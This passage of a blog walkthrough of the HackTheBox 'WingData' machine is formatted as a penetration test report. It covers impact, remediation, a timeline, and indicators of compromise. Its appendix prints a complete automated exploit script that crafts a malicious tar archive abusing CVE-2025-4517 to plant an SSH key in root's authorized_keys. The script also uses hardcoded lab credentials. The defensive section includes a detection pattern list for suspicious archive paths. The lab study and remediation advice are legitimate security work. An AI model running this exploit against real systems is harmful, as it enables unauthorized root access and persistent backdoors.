+</code></pre><h3 id="62-why-security-controls-failed">6.2 Why Security Controls Failed</h3><table><thead><tr><th>Security Control</th><th>Status</th><th>Failure Reason</th></tr></thead><tbody><tr><td>Filename Validation</td><td>✅ Passed</td><td>Only validates format, not content</td></tr><tr><td>Directory Validation</td><td>✅ Passed</td><td>Only validates format, not content</td></tr><tr><td>Fixed Base Paths</td><td>✅ Passed</td><td>Archive <em>contents</em> are attacker-controlled</td></tr><tr><td><code>filter=&quot;data&quot;</code></td><td>❌ <strong>BYPASSED</strong></td><td>CVE-2025-4517: PATH_MAX overflow</td></tr><tr><td>Path Canonicalization</td><td>❌ <strong>FAILED</strong></td><td><code>realpath()</code> incomplete on long paths</td></tr><tr><td>Symlink Following</td><td>❌ <strong>EXPLOITED</strong></td><td>Filesystem resolves differently than filter</td></tr></tbody></table><h3 id="63-attack-surface-analysis">6.3 Attack Surface Analysis</h3><p><strong>Key Insight</strong>: While the Python script itself had robust input validation, the vulnerability existed in a <strong>dependency</strong> (Python’s tarfile module). This demonstrates the importance of:</p><ol><li>Keeping all dependencies updated</li><li>Understanding the security properties of third-party code</li><li>Defense in depth (multiple layers of security)</li><li>Regular vulnerability scanning of the entire stack</li></ol><hr><h2 id="7-impact-assessment">7. Impact Assessment</h2><h3 id="71-severity-rating">7.1 Severity Rating</h3><p><strong>CVSS v3.1 Score</strong>: 9.8 (Critical)</p><p><strong>Vector</strong>: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code></p><p><strong>Breakdown</strong>:</p><ul><li><strong>Attack Vector (AV:N)</strong>: Network - Exploitable remotely via SSH</li><li><strong>Attack Complexity (AC:L)</strong>: Low - No special conditions required</li><li><strong>Privileges Required (PR:L)</strong>: Low - Requires user-level SSH access</li><li><strong>User Interaction (UI:N)</strong>: None - Fully automated exploitation</li><li><strong>Scope (S:C)</strong>: Changed - Breaks security boundary (user → root)</li><li><strong>Confidentiality (C:H)</strong>: High - Full access to all system files</li><li><strong>Integrity (I:H)</strong>: High - Can modify any system file as root</li><li><strong>Availability (A:H)</strong>: High - Can disrupt or destroy the system</li></ul><h3 id="72-business-impact">7.2 Business Impact</h3><p><strong>Critical Findings</strong>:</p><ol><li><p><strong>Complete System Compromise</strong></p><ul><li>Full root/administrator access achieved</li><li>Attacker can read, modify, or delete any file</li><li>Complete control over system services and processes</li></ul></li><li><p><strong>Persistent Backdoor Established</strong></p><ul><li>SSH public key injected into root’s authorized_keys</li><li>Backdoor survives reboots</li><li>Allows future access without re-exploitation</li></ul></li><li><p><strong>Data Exposure</strong></p><ul><li>Access to all user data (<code>/home/*</code>)</li><li>Access to system configuration files (<code>/etc/*</code>)</li><li>Access to logs and sensitive information</li></ul></li><li><p><strong>Lateral Movement Potential</strong></p><ul><li>Compromised system can be used as pivot point</li><li>SSH keys for other systems may be present</li><li>Trust relationships with other machines could be abused</li></ul></li><li><p><strong>Compliance Violations</strong></p><ul><li>Unauthorized root access</li><li>Potential data breach</li><li>Security control bypass</li></ul></li></ol><h3 id="73-risk-rating">7.3 Risk Rating</h3><table><thead><tr><th>Risk Factor</th><th>Rating</th><th>Justification</th></tr></thead><tbody><tr><td><strong>Likelihood</strong></td><td>High</td><td>User-level access easily obtainable; exploit reliable and repeatable</td></tr><tr><td><strong>Impact</strong></td><td>Critical</td><td>Complete system compromise with persistent access</td></tr><tr><td><strong>Overall Risk</strong></td><td><strong>CRITICAL</strong></td><td>Immediate remediation required</td></tr></tbody></table><hr><h2 id="8-remediation-recommendations">8. Remediation Recommendations</h2><h3 id="81-immediate-actions-priority-1---critical">8.1 Immediate Actions (Priority 1 - Critical)</h3><h4 id="811-update-python-to-patched-version">8.1.1 Update Python to Patched Version</h4><p><strong>Current Version</strong>: Python 3.12.3 (Vulnerable)<br><strong>Required Version</strong>: Python 3.12.8+ or 3.13.1+ (Patched)</p><p><strong>Command</strong>:</p><pre><code class="language-bash">apt update &amp;&amp; apt upgrade python3
+</code></pre><p><strong>Verification</strong>:</p><pre><code class="language-bash">python3 --version
+python3 -c &quot;import tarfile; print(tarfile.__file__)&quot;
+</code></pre><p><strong>Patch Details</strong>:</p><ul><li>GitHub PR: <a href="https://github.com/python/cpython/pull/135037">https://github.com/python/cpython/pull/135037</a></li><li>Fixes <code>os.path.realpath()</code> behavior with PATH_MAX overflow</li><li>Adds strict validation in tarfile filter</li></ul><h4 id="812-remove-backdoor-access">8.1.2 Remove Backdoor Access</h4><p><strong>Remove Injected SSH Key</strong>:</p><pre><code class="language-bash"># Backup current authorized_keys
+cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys.backup
+
+# Edit and remove unauthorized key
+vi /root/.ssh/authorized_keys
+
+# Or recreate with only authorized keys
+cat &gt; /root/.ssh/authorized_keys &lt;&lt; &#39;EOF&#39;
+# Add only legitimate SSH keys here
+EOF
+
+chmod 600 /root/.ssh/authorized_keys
+</code></pre><p><strong>Audit All User SSH Keys</strong>:</p><pre><code class="language-bash"># Check all users&#39; authorized_keys
+find /home -name &quot;authorized_keys&quot; -exec echo {} \; -exec cat {} \;
+find /root -name &quot;authorized_keys&quot; -exec echo {} \; -exec cat {} \;
+</code></pre><h4 id="813-revoke-sudo-privileges">8.1.3 Revoke Sudo Privileges</h4><p><strong>Current Sudo Configuration</strong>:</p><pre><code class="language-bash">wacky ALL=(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+</code></pre><p><strong>Option 1: Remove Entirely</strong> (Recommended if not needed)</p><pre><code class="language-bash"># Edit sudoers file
+visudo
+
+# Remove or comment out the line:
+# wacky ALL=(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+</code></pre><p><strong>Option 2: Restrict Arguments</strong> (If functionality needed)</p><pre><code class="language-bash"># Replace wildcard with specific allowed arguments
+wacky ALL=(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_*.tar -r restore_*
+
+# Or use sudo command wrapper that validates arguments
+wacky ALL=(root) NOPASSWD: /usr/local/bin/restore_backup_wrapper.sh
+</code></pre><h4 id="814-review-system-for-compromise-indicators">8.1.4 Review System for Compromise Indicators</h4><p><strong>Check for Additional Backdoors</strong>:</p><pre><code class="language-bash"># Check for unusual cron jobs
+crontab -l
+ls -la /etc/cron.*
+cat /etc/crontab
+
+# Check for SUID binaries
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Check for modified system files
+debsums -c
+rpm -Va  # For RHEL-based systems
+
+# Review recent commands
+cat /root/.bash_history
+cat /home/*/.bash_history
+
+# Check active SSH sessions
+w
+who
+last
+
+# Review auth logs
+grep -i &quot;Accepted publickey&quot; /var/log/auth.log
+grep -i &quot;session opened&quot; /var/log/auth.log
+</code></pre><h3 id="82-short-term-actions-priority-2---high">8.2 Short-Term Actions (Priority 2 - High)</h3><h4 id="821-implement-defense-in-depth">8.2.1 Implement Defense in Depth</h4><p><strong>Add Additional Validation to Backup Script</strong>:</p><pre><code class="language-python"># Add at the start of restore_backup_clients.py
+
+import hashlib
+
+ALLOWED_TAR_HASHES = {
+    &quot;sha256_hash_1&quot;: &quot;backup_1001.tar&quot;,
+    &quot;sha256_hash_2&quot;: &quot;backup_1002.tar&quot;,
+    # Whitelist of known-good backup hashes
+}
+
+def validate_tar_integrity(filepath):
+    &quot;&quot;&quot;Verify tar file hasn&#39;t been tampered with&quot;&quot;&quot;
+    sha256_hash = hashlib.sha256()
+    with open(filepath, &quot;rb&quot;) as f:
+        for byte_block in iter(lambda: f.read(4096), b&quot;&quot;):
+            sha256_hash.update(byte_block)
+    
+    computed_hash = sha256_hash.hexdigest()
+    if computed_hash not in ALLOWED_TAR_HASHES:
+        print(f&quot;[!] Unauthorized tar file detected&quot;, file=sys.stderr)
+        sys.exit(1)
+</code></pre><p><strong>Implement Tar Scanning</strong>:</p><pre><code class="language-python">def scan_tar_for_suspicious_content(tar_path):
+    &quot;&quot;&quot;Scan tar for malicious patterns&quot;&quot;&quot;
+    suspicious_patterns = [
+        r&quot;\.\.\/&quot;,  # Path traversal
+        r&quot;^\/&quot;,     # Absolute paths
+        r&quot;authorized_keys&quot;,
+        r&quot;\.ssh&quot;,
+        r&quot;\/etc\/&quot;,
+        r&quot;\/root\/&quot;
+    ]
+    
+    with tarfile.open(tar_path, &quot;r&quot;) as tar:
+        for member in tar.getmembers():
+            # Check for suspicious names
+            for pattern in suspicious_patterns:
+                if re.search(pattern, member.name):
+                    print(f&quot;[!] Suspicious content detected: {member.name}&quot;)
+                    return False
+            
+            # Check for symlinks pointing outside
+            if member.issym() or member.islnk():
+                if member.linkname.startswith(&#39;/&#39;) or &#39;..&#39; in member.linkname:
+                    print(f&quot;[!] Suspicious link: {member.name} -&gt; {member.linkname}&quot;)
+                    return False
+    
+    return True
+</code></pre><h4 id="822-implement-monitoring-and-alerting">8.2.2 Implement Monitoring and Alerting</h4><p><strong>File Integrity Monitoring</strong>:</p><pre><code class="language-bash"># Install AIDE or Tripwire
+apt install aide
+
+# Initialize database
+aideinit
+
+# Configure to monitor critical paths
+cat &gt;&gt; /etc/aide/aide.conf &lt;&lt; &#39;EOF&#39;
+/root/.ssh R
+/opt/backup_clients R
+/etc/sudoers R
+EOF
+
+# Set up daily checks
+cat &gt; /etc/cron.daily/aide-check &lt;&lt; &#39;EOF&#39;
+#!/bin/bash
+/usr/bin/aide --check | mail -s &quot;AIDE Report&quot; security@company.com
+EOF
+chmod +x /etc/cron.daily/aide-check
+</code></pre><p><strong>SSH Key Change Monitoring</strong>:</p><pre><code class="language-bash"># Create monitoring script
+cat &gt; /usr/local/bin/monitor_ssh_keys.sh &lt;&lt; &#39;EOF&#39;
+#!/bin/bash
+KEYFILE=&quot;/root/.ssh/authorized_keys&quot;
+CHECKSUM_FILE=&quot;/var/lib/ssh_key_monitor/authorized_keys.sha256&quot;
+
+mkdir -p /var/lib/ssh_key_monitor
+
+CURRENT_HASH=$(sha256sum &quot;$KEYFILE&quot; | cut -d&#39; &#39; -f1)
+STORED_HASH=$(cat &quot;$CHECKSUM_FILE&quot; 2&gt;/dev/null)
+
+if [ &quot;$CURRENT_HASH&quot; != &quot;$STORED_HASH&quot; ]; then
+    echo &quot;WARNING: Root SSH authorized_keys has been modified!&quot; | \
+        mail -s &quot;SECURITY ALERT: SSH Key Change&quot; security@company.com
+    logger -p auth.alert &quot;Root SSH authorized_keys modified&quot;
+    echo &quot;$CURRENT_HASH&quot; &gt; &quot;$CHECKSUM_FILE&quot;
+fi
+EOF
+
+chmod +x /usr/local/bin/monitor_ssh_keys.sh
+
+# Add to cron
+echo &quot;*/5 * * * * /usr/local/bin/monitor_ssh_keys.sh&quot; &gt;&gt; /etc/crontab
+</code></pre><p><strong>Sudo Command Logging</strong>:</p><pre><code class="language-bash"># Enable detailed sudo logging
+cat &gt;&gt; /etc/sudoers &lt;&lt; &#39;EOF&#39;
+Defaults log_output
+Defaults!/usr/bin/sudoreplay !log_output
+Defaults log_year, log_host, logfile=&quot;/var/log/sudo/sudo.log&quot;
+EOF
+
+# Set up log forwarding to SIEM
+# Configure rsyslog or similar
+</code></pre><h4 id="823-implement-least-privilege">8.2.3 Implement Least Privilege</h4><p><strong>Create Dedicated Backup User</strong>:</p><pre><code class="language-bash"># Create service account
+useradd -r -s /bin/false backup_service
+
+# Create wrapper script
+cat &gt; /usr/local/bin/restore_backup_wrapper.sh &lt;&lt; &#39;EOF&#39;
+#!/bin/bash
+BACKUP_DIR=&quot;/opt/backup_clients/backups&quot;
+RESTORE_DIR=&quot;/opt/backup_clients/restored_backups&quot;
+
+# Validate inputs
+if [[ ! $1 =~ ^backup_[0-9]+\.tar$ ]]; then
+    echo &quot;Invalid backup filename&quot;
+    exit 1
+fi
+
+# Run as backup_service user (not root)
+sudo -u backup_service /usr/local/bin/python3 \
+    /opt/backup_clients/restore_backup_clients.py \
+    -b &quot;$1&quot; -r &quot;restore_$(date +%s)&quot;
+EOF
+
+chmod 755 /usr/local/bin/restore_backup_wrapper.sh
+
+# Update sudoers to use wrapper
+# wacky ALL=(root) NOPASSWD: /usr/local/bin/restore_backup_wrapper.sh
+</code></pre><h3 id="83-long-term-actions-priority-3---medium">8.3 Long-Term Actions (Priority 3 - Medium)</h3><h4 id="831-security-hardening">8.3.1 Security Hardening</h4><ol><li><p><strong>Enable SELinux/AppArmor</strong></p><ul><li>Restrict file access even for root processes</li><li>Create profiles for backup scripts</li></ul></li><li><p><strong>Implement Network Segmentation</strong></p><ul><li>Isolate backup systems from production networks</li><li>Restrict SSH access to jump hosts only</li></ul></li><li><p><strong>Multi-Factor Authentication</strong></p><ul><li>Require MFA for all SSH access</li><li>Implement hardware keys (YubiKey, etc.)</li></ul></li><li><p><strong>Regular Security Audits</strong></p><ul><li>Quarterly penetration testing</li><li>Monthly vulnerability scanning</li><li>Weekly sudo privilege reviews</li></ul></li></ol><h4 id="832-alternative-backup-solutions">8.3.2 Alternative Backup Solutions</h4><p><strong>Consider Replacing Custom Script</strong>:</p><ul><li>Use established backup solutions (Bacula, Amanda, BorgBackup)</li><li>These have been security-audited and hardened</li><li>Better logging, encryption, and validation</li></ul><p><strong>If Custom Script Required</strong>:</p><ul><li>Avoid using <code>tarfile</code> for untrusted archives</li><li>Use containerization (Docker) to isolate extraction</li><li>Implement chroot jails for extraction processes</li></ul><h4 id="833-incident-response-plan">8.3.3 Incident Response Plan</h4><p><strong>Develop Playbook for Similar Incidents</strong>:</p><ol><li>Detection triggers and alerting</li><li>Containment procedures (isolate system)</li><li>Eradication steps (remove backdoors)</li><li>Recovery procedures (restore from known-good state)</li><li>Post-incident review process</li></ol><hr><h2 id="9-timeline">9. Timeline</h2><table><thead><tr><th>Time (UTC)</th><th>Event</th><th>Details</th></tr></thead><tbody><tr><td>10:43:00</td><td>Initial Connection</td><td>SSH to target as user <code>wacky</code></td></tr><tr><td>10:43:15</td><td>Enumeration</td><td>Discovered sudo privileges with <code>sudo -l</code></td></tr><tr><td>10:43:30</td><td>Vulnerability Analysis</td><td>Identified CVE-2025-4517 in backup script</td></tr><tr><td>10:44:00</td><td>SSH Key Generation</td><td>Created Ed25519 key pair on Kali</td></tr><tr><td>10:44:30</td><td>Exploit Development</td><td>Created malicious tar archive</td></tr><tr><td>10:44:45</td><td>Tar Upload</td><td>Uploaded <code>backup_1337.tar</code> to target</td></tr><tr><td>10:45:00</td><td>Positioning</td><td>Moved tar to <code>/opt/backup_clients/backups/</code></td></tr><tr><td>10:45:15</td><td>Exploitation</td><td>Triggered sudo script with malicious tar</td></tr><tr><td>10:45:20</td><td>Success</td><td>Extraction completed, SSH key injected</td></tr><tr><td>10:45:35</td><td>Root Access</td><td>Authenticated as root via SSH key</td></tr><tr><td>10:45:40</td><td>Flag Retrieval</td><td>Retrieved <code>/root/root.txt</code></td></tr><tr><td>10:45:50</td><td>Documentation</td><td>Began compiling this report</td></tr></tbody></table><p><strong>Total Time to Compromise</strong>: ~2 minutes from enumeration to root access</p><hr><h2 id="10-appendices">10. Appendices</h2><h4 id="a1-malicious-tar-generator">A.1 Malicious Tar Generator</h4><p>See full Python script in Section 5.2, Step 2</p><pre><code class="language-bash">#!/bin/bash
+# wingdata_exploit.sh - Automated exploitation
+
+TARGET=&quot;wingdata.htb&quot;
+USER=&quot;wacky&quot;
+PASS=&#39;!#7Blushing^*Bride5&#39;
+
+echo &quot;[*] Generating SSH keys...&quot;
+ssh-keygen -t ed25519 -f root_key -N &quot;&quot; -q
+PUBKEY=$(cat root_key.pub)
+
+echo &quot;[*] Creating malicious tar...&quot;
+python3 &lt;&lt; EOFPYTHON
+import tarfile, os, io
+EVIL_TAR=&quot;backup_1337.tar&quot;
+TRAV=&quot;/../../../../root/.ssh/authorized_keys&quot;
+PUB=&quot;$PUBKEY&quot;
+comp=&#39;d&#39;*247
+steps=&quot;abcdefghijklmnop&quot;
+path=&quot;&quot;
+with tarfile.open(EVIL_TAR,mode=&quot;x&quot;) as tar:
+    for i in steps:
+        a=tarfile.TarInfo(os.path.join(path,comp))
+        a.type=tarfile.DIRTYPE
+        tar.addfile(a)
+        b=tarfile.TarInfo(os.path.join(path,i))
+        b.type=tarfile.SYMTYPE
+        b.linkname=comp
+        tar.addfile(b)
+        path=os.path.join(path,comp)
+    linkpath=os.path.join(&quot;/&quot;.join(steps),&quot;l&quot;*254)
+    l=tarfile.TarInfo(linkpath)
+    l.type=tarfile.SYMTYPE
+    l.linkname=(&quot;../&quot;*len(steps))
+    tar.addfile(l)
+    e=tarfile.TarInfo(&quot;escape&quot;)
+    e.type=tarfile.SYMTYPE
+    e.linkname=linkpath+TRAV
+    tar.addfile(e)
+    f=tarfile.TarInfo(&quot;flaglink&quot;)
+    f.type=tarfile.LNKTYPE
+    f.linkname=&quot;escape&quot;
+    tar.addfile(f)
+    content=PUB.encode()+b&quot;\n&quot;
+    c=tarfile.TarInfo(&quot;flaglink&quot;)
+    c.type=tarfile.REGTYPE
+    c.size=len(content)
+    tar.addfile(c,fileobj=io.BytesIO(content))
+print(&quot;OK&quot;)
+EOFPYTHON
+
+echo &quot;[*] Uploading tar...&quot;
+sshpass -p &quot;$PASS&quot; scp -o StrictHostKeyChecking=no \
+    backup_1337.tar $USER@$TARGET:/tmp/
+
+echo &quot;[*] Moving to backup directory...&quot;
+sshpass -p &quot;$PASS&quot; ssh -o StrictHostKeyChecking=no $USER@$TARGET \
+    &quot;cp /tmp/backup_1337.tar /opt/backup_clients/backups/&quot;
+
+echo &quot;[*] Triggering exploit...&quot;
+sshpass -p &quot;$PASS&quot; ssh -o StrictHostKeyChecking=no $USER@$TARGET \
+    &quot;sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
+     -b backup_1337.tar -r restore_exploit&quot;
+
+echo &quot;[*] Getting root flag...&quot;
+sleep 3
+chmod 600 root_key
+ssh -i root_key -o StrictHostKeyChecking=no root@$TARGET &quot;cat /root/root.txt&quot;
+</code></pre><h3 id="appendix-b-vulnerability-references">Appendix B: Vulnerability References</h3><ul><li><strong>CVE-2025-4517</strong>: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4517">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4517</a></li><li><strong>Google Security Advisory</strong>: <a href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f</a></li><li><strong>Python Patch</strong>: <a href="https://github.com/python/cpython/pull/135037">https://github.com/python/cpython/pull/135037</a></li><li><strong>Original Writeup</strong>: <a href="https://4xura.com/writeups-for-ctfs/htb/htb-writeup-wingdata/">https://4xura.com/writeups-for-ctfs/htb/htb-writeup-wingdata/</a></li></ul><h3 id="appendix-c-iocs-indicators-of-compromise">Appendix C: IOCs (Indicators of Compromise)</h3><p><strong>Files Created/Modified</strong>:</p><pre><code>/tmp/backup_1337.tar
+/opt/backup_clients/backups/backup_1337.tar
+/opt/backup_clients/restored_backups/restore_exploit/
+/root/.ssh/authorized_keys (MODIFIED)
+</code></pre><p><strong>Network Indicators</strong>:</p><pre><code>SSH connections from Kali host to wingdata.htb:22
+SCP transfers of backup_1337.tar
+Outbound SSH from target (if reverse shell used)
+</code></pre><p><strong>Log Indicators</strong>:</p><pre><code class="language-bash"># /var/log/auth.log
+Feb 15 10:45:20 wingdata sshd[1234]: Accepted publickey for root from &lt;attacker_ip&gt;
+Feb 15 10:45:15 wingdata sudo: wacky : TTY=pts/0 ; PWD=/home/wacky ; 
+    USER=root ; COMMAND=/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py
+</code></pre><p><strong>SSH Key Fingerprint</strong>:</p><pre><code>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM1GIgGyiyAmfAgWTDpfM02fuwKV2DNEqQxvAHVd4Y2p
+MD5: &lt;fingerprint&gt;
+SHA256: &lt;fingerprint&gt;
+</code></pre><h2 id="conclusion">Conclusion</h2><p>This penetration test successfully demonstrated a critical privilege escalation vulnerability in the WingData HTB machine. The exploitation of CVE-2025-4517 through a sudo-accessible Python script allowed complete root compromise in under 2 minutes.</p><p><strong>Key Takeaways</strong>:</p><ol><li><strong>Dependency Vulnerabilities are Critical</strong>: Even with perfect input validation, vulnerabilities in dependencies (Python’s tarfile) can compromise security</li><li><strong>Defense in Depth is Essential</strong>: Multiple security layers would have prevented or detected this attack</li><li><strong>Sudo Privileges Must be Carefully Managed</strong>: NOPASSWD sudo access to scripts handling untrusted data is extremely dangerous</li><li><strong>Keep Software Updated</strong>: The patched Python version would have prevented this exploit entirely</li><li><strong>Monitor Critical Files</strong>: Changes to SSH authorized_keys should trigger immediate alerts</li></ol><p><strong>Final Status</strong>:</p><ul><li>✅ Root access achieved</li><li>✅ Root flag retrieved: <code>5df871f9bc04066e5a415192d28943d8</code></li><li>✅ Persistent backdoor established</li><li>✅ Remediation recommendations provided</li></ul></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-4517/">CVE-2025-4517</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2025-47812/">CVE-2025-47812</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/wingdatahtb/">wingdata.htb</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fwingdata%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Hackthebox%20Wingdata%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fwingdata%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Hackthebox%20Wingdata%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fwingdata%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/postman-installation-guide-on-kali-linux/" class="content__nav-link" rel="prev"><div><span>Previous</span> Postman Installation Guide on Kali Linux</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/tryhackme-soupedcode-walkthrough/" class="content__nav-link" rel="next"><div><span>Next</span> TryHackme Soupedcode Walkthrough </div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
